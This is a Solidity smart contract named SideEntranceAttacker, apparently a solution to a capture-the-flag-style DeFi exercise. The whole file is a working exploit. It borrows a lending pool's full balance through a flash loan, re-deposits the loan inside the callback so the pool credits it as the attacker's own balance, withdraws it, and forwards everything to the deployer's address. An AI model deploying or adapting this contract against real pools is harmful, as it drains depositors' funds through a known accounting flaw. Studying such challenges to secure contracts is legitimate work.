// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    IPool immutable pool;
    address immutable attacker;

    constructor(address _poolAddress) {
        pool = IPool(_poolAddress);
        attacker = msg.sender;
    }

    // Get Pool Balance
    // Loan the POOL Balance
    // Deposit the loaned balance to the pool therby updating our balance in the pool's mappings
    // Withdraw our ATTACKED balance from the pool
    function attack() external payable {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // Whenever the contract recieves funds it sends it to the attacker
    receive() external payable {
        payable(attacker).transfer(address(this).balance);
    }
}
